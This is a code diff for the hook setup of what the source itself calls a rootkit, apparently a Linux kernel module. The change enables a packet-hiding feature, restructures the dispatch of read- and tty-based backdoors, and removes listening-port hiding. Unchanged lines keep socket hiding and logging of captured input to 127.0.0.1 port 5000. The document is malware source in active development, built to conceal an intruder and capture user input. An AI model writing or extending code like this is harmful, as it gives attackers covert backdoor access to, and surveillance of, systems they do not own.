@@ -22,7 +22,7 @@
 #include "read.h"
 #include "inputlog.h"
 #include "sockhide.h"
-/* #include "packhide.h" */
+#include "packhide.h"
 #include "porthide.h"
 
 extern rootkit_t rootkit;
@@ -63,6 +63,7 @@ init_hooks(void)
     atomic_set(&read_install_count, 0);
     atomic_set(&tty_read_install_count, 0);
     atomic_set(&getdents_install_count, 0);
+    atomic_set(&packet_rcv_install_count, 0);
 
     atomic_set(&read_count, 0);
     atomic_set(&tty_read_count, 0);
@@ -89,16 +90,14 @@ init_hooks(void)
     if (rootkit.hiding_sockets)
         hide_sockets();
 
-    /* if (rootkit.hiding_packets) */
-    /*     hide_packets(); */
+    if (rootkit.hiding_packets)
+        hide_packets();
 
-    if (rootkit.hiding_ports)
-        hide_lports();
-
-    if (rootkit.backdoor == BD_READ)
-        backdoor_read();
-    else if (rootkit.backdoor == BD_TTY)
-        backdoor_tty();
+    switch (rootkit.backdoor) {
+    case BD_READ: backdoor_read(); break;
+    case BD_TTY:  backdoor_tty();  break;
+    default: break;
+    }
 
     if (rootkit.logging_input)
         log_input("127.0.0.1", "5000");
@@ -124,11 +123,8 @@ remove_hooks(void)
     if (rootkit.hiding_sockets)
         unhide_sockets();
 
-    /* if (rootkit.hiding_packets) */
-    /*     unhide_packets(); */
-
-    if (rootkit.hiding_ports)
-        unhide_lports();
+    if (rootkit.hiding_packets)
+        unhide_packets();
 
     if (rootkit.backdoor != BD_OFF)
         unbackdoor();
